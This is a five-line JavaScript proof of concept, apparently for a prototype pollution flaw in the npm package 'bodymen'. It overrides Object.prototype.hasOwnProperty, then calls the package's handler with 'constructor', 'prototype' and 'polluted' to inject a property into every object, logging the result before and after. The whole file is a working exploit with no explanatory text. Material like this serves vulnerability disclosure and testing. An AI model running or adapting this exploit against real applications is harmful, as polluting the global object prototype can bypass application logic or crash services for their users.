Object.prototype.hasOwnProperty = () => true;
const x = require('bodymen');
console.log({}.polluted);
x.handler('constructor', 'prototype', 'polluted', 'yes');
console.log({}.polluted);